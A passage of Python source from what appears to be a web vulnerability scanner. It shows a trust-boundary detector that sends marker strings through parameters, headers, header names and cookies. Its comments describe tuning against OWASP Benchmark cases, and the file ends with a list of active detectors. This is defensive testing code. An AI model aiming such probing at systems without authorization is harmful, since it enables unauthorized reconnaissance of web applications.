        p = next((x for x in ep.parameters
                  if x.kind != ParamKind.TOKEN and not x.flow_control and x.name), None)
        if p is not None:
            probes.append((p.name, f"param:{p.name}", "tb-m",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=p.name, param_value=m, note=note)),
                           f"channel=param anchor={p.name[:64]}"))
        elif seg_ok:
            # (pre-TB, kept verbatim) the no-param fallback: the marker as a
            # param NAME, the segment as the value (the resolver shape)
            probes.append(("<name-channel>", "segment-name", "tb-mn",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=m, param_value=seg, note=note)),
                           f"channel=segment_name anchor={seg[:64]}"))
        # TB-2 (trustbound recall round — the WRONG-PARAM-PICK root cause,
        # live-proven on BenchmarkTest01617 in the diagnosis round): the
        # engine probed ONLY the FIRST declared mutable param's VALUE, but
        # the family servlet reads the trust-boundary param that is NEITHER
        # first NOR segment-named (01617: the spec declares [password, email,
        # BenchmarkTest01617], the servlet reads the TCID-named THIRD param;
        # live: the first-param probe echoed the TCID param's ORIGINAL value
        # while ?<TCID>=<marker> was LIVE). The first-param pick is a guess
        # that fails whenever the real boundary param sits later in the
        # declaration order — EVERY other mutable param's VALUE now joins the
        # battery (after the first, before the self-named channel; a param
        # named exactly like the URL segment is left to the self-named
        # channel, which mutates it in place — the identical request).
        if p is not None:
            for q in ep.parameters:
                if q is p or q.kind == ParamKind.TOKEN or q.flow_control or not q.name:
                    continue
                if seg_ok and q.name == seg:
                    continue
                probes.append((q.name, f"param:{q.name}", "tb-p",
                               lambda m, note, _n=q.name: self.engine.send(
                                   RequestMutation(endpoint=ep, param_name=_n,
                                                   param_value=m, note=note)),
                               f"channel=param anchor={q.name[:64]}"))
        # TB-1a (trustbound recall round, live-caught on the OWASP Benchmark
        # 8b67a88 — 35 of the 51 FNs: tcid-value 20 + raw-query-string 10 +
        # map-read 5): the benchmark trust-boundary servlets read the request
        # parameter NAMED AFTER THE ENDPOINT'S OWN URL SEGMENT —
        # request.getParameter("<TCID>"), a getQueryString() substring, or a
        # getParameterMap() scan for the TCID key — while the engine only ever
        # probed the FIRST declared param's value (live-proven on
        # BenchmarkTest00031/02622: ?<TCID>=<marker> reflects with the session
        # phrase; the first-param probe answers a constant; the marker-as-NAME
        # no-param fallback is BACKWARDS for this family and only fires when
        # nothing is declared anyway). The self-named VALUE probe rides the
        # channel the app actually reads: the param named <last-segment>=M1/M2
        # (mutated in place when the spec declared it — query or body, the
        # servlet reads the merged parameter map by NAME; appended to the
        # query string when it did not).
        if seg_ok and not (p is not None and p.name == seg):
            probes.append((seg, f"selfnamed:{seg}", "tb-sn",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=seg, param_value=m, note=note)),
                           f"channel=selfnamed anchor={seg[:64]}"))
        # TB-3a (trustbound recall round, hand-proven LIVE on the running
        # Benchmark before any code — 00587/00588/01455/01456/01457/01458/
        # 02352): the RESOLVER family scans getParameterNames(), takes the
        # NAME of the param whose VALUE equals the endpoint's own basename
        # burhan, and uses that NAME as the tainted string — the
        # SQ-1/XS-1/CM-2 resolver shape. The name-channel probe existed only
        # as the NO-PARAM fallback (?<marker>=<seg> fired solely when the
        # spec declared NOTHING), so every resolver endpoint WITH declared
        # params (the whole family declares [answer, whatever] or [password,
        # email, TCID]) never saw the marker ride a NAME (live on 00587:
        # ?<marker>=<TCID> reflects with the session phrase while every value
        # probe answers a constant; the mangle members need the tail riding
        # the NAME — live on 00588: plain reflects 'burhantb1marke').
        # The channel now fires whenever a basename exists and params are
        # declared (the paramless case is the pre-TB fallback above).
        if seg_ok and p is not None:
            probes.append(("<resolver-name>", "resolver-name", "tb-rn",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=m, param_value=seg, note=note)),
                           f"channel=resolver_name anchor={seg[:64]}"))
        # TB-3b (trustbound recall round, hand-proven LIVE on the running
        # Benchmark before any code — 01082/01206/01958/01960): the family
        # servlet reads the VALUE of the request header NAMED AFTER THE
        # ENDPOINT'S OWN BASENAME (request.getHeader("<TCID>"), URL-decoded)
        # and crosses it into the trusted store — no probe ever put the
        # marker in a header named after the endpoint itself (hand-probes:
        # 01082 plain DEAD — the drop-last mangle reflects
        # 'burhantb1marke' — tailed LIVE; 01206 plain DEAD — rewrite to
        # '...markeZ' — tailed LIVE). The probe: a header named <basename>
        # carrying the marker as its VALUE (the OWSP-07 HEADER dispatch).
        if seg_ok:
            probes.append((seg, "header-tcid-value", "tb-ht",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=seg, param_value=m,
                               param_location=ParamLocation.HEADER, note=note)),
                           f"channel=header_tcid anchor={seg[:64]}"))
        # TB-3c (trustbound recall round, hand-proven LIVE on the running
        # Benchmark before any code — 01876, the last of the 51 FNs): the
        # servlet scans request.getCookies() for the cookie NAMED AFTER THE
        # ENDPOINT'S OWN BASENAME, URL-decodes its VALUE, and crosses it into
        # the trusted store — the battery had no cookie channel (hand-probe:
        # 01876 plain cookie DEAD — the drop-last mangle reflects
        # 'burhantb1marke' — cookie-tail LIVE). The probe: a cookie named
        # <basename> carrying the marker as its VALUE (the OWSP-07 COOKIE
        # dispatch; the session jar rides along path-scoped, the mutation's
        # cookie always wins its name).
        if seg_ok:
            probes.append((seg, "cookie-value", "tb-ck",
                           lambda m, note: self.engine.send(RequestMutation(
                               endpoint=ep, param_name=seg, param_value=m,
                               param_location=ParamLocation.COOKIE, note=note)),
                           f"channel=cookie anchor={seg[:64]}"))
        # TB-1b (trustbound recall round, live-caught on the OWASP Benchmark
        # 8b67a88 — the header-name family: 00251/01143/02015/02016): the
        # servlet scans request.getHeaderNames(), SKIPS the standard headers,
        # and takes the NAME of the first non-standard header as the tainted
        # string (saved into the session and echoed) — no engine probe ever
        # put the marker in a HEADER NAME. The probe rides the mutation's
        # extra_headers on a clone with header params dropped — the family's
        # own openapi declares a NON-STANDARD header param (whatever) that
        # wins the first-non-standard race when it rides along (live-caught:
        # the first engine attempt stayed silent on 00251 while the marker-
        # only hand probe was LIVE).
        ep_hn = _clone_ep_drop_header_params(ep)
        probes.append(("<header-name>", "header-name", "tb-hn",
                       lambda m, note: self.engine.send(RequestMutation(
                           endpoint=ep_hn, extra_headers={m: "1"}, note=note)),
                       "channel=headername"))
        # ---- pass 1: the PLAIN variants (the pre-TB-1c sequence, unchanged
        # for every channel) ----
        results = []
        for label, channel, pfx, mk, nc in probes:
            r1 = mk(self.M1, pfx + "1")
            r2 = mk(self.M2, pfx + "2")
            results.append([label, channel, nc, r1, r2, "plain"])
        # ---- pass 2 (TB-1c): the SACRIFICIAL-TAIL variants, only on channels
        # whose plain pass missed ----
        for i, (label, channel, nc, r1, r2, variant) in enumerate(results):
            if self._pair_hit(r1, r2) is None:
                _, _, pfx, mk, _ = probes[i]
                rt1 = mk(self.M1 + self.TAIL, pfx + "1t")
                rt2 = mk(self.M2 + self.TAIL, pfx + "2t")
                results[i] = [label, channel, nc, rt1, rt2, "tail"]
        # ---- verdict loop (the differential + GTP-08b context guard) ----
        for label, channel, nc, r1, r2, variant in results:
            hit = self._pair_hit(r1, r2)
            if hit is None:
                continue
            b1, b2 = hit
            # GTP-08b: the marker must sit within a bounded window of a
            # session/storage CONTEXT phrase — the CWE-501 shape is the value
            # being SAVED into a server-trusted context and the response saying
            # so; a bare reflection (xss/sqli/redirect echo) carries no such
            # phrase and is that other class's evidence, not a boundary claim.
            i = b1.find(self.M1)
            ctx_win = self.CONTEXT.search(b1, max(0, i - 100), min(len(b1), i + len(self.M1) + 120))
            i2 = b2.find(self.M2)
            ctx_win2 = self.CONTEXT.search(b2, max(0, i2 - 100), min(len(b2), i2 + len(self.M2) + 120))
            if not ctx_win and not ctx_win2:
                continue      # reflect-only — belongs to another class, stay silent
            sub = ("the plain marker" if variant == "plain"
                   else "the sacrificial-tail marker (marker+'zz' — the sink's "
                        "last-char mangle ate the tail; the UNTAILED marker "
                        "survived verbatim)")
            return Finding("trust_bound", Severity.HIGH, ep.url,
                           label, ep.method,
                           [Evidence("marker_reflection",
                                     f"input-controlled reflection into a server-trusted "
                                     f"context via {channel} ({sub}): marker A reflected on "
                                     f"request 1 and marker B on request 2 (each response "
                                     f"echoes exactly the submitted marker within a "
                                     f"session/storage context — "
                                     f"{(ctx_win.group(0) if ctx_win else (ctx_win2.group(0) if ctx_win2 else ''))!r} "
                                     f"— unvalidated client data crosses into a trusted store)",
                                     r1.request_id),
                            Evidence("input_channel",
                                     nc + f" variant={variant} — the verifier must replay "
                                     "the same channel and variant")],
                           status=FindingStatus.CANDIDATE)
        return None


ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector,
                    XxeDetector, SsrfDetector, CommandInjectionDetector, CorsDetector,
                    SstiDetector, CsrfDetector, NosqlDetector, JwtDetector, HostHeaderDetector,
                    StoredXSSDetector, PathTraversalDetector, UploadDetector,
                    CmdiEchoDetector, XPathDetector, LdapDetector, SecureCookieDetector,
                    TrustBoundDetector, HeaderNameTraversalDetector,
                    ParamNameTraversalDetector]

# Detectors that drive their own multi-request flows per ENDPOINT (no param-bound
# generic loop) — the orchestrator calls det.run(ep) directly, like CORS.
RUN_STYLE_DETECTORS = {"cors", "ssti", "csrf", "nosql", "jwt", "hostheader", "upload",
                       "cmdi_echo", "xpath", "ldapi", "securecookie", "trustbound",
                       "trav_hname", "trav_pname"}
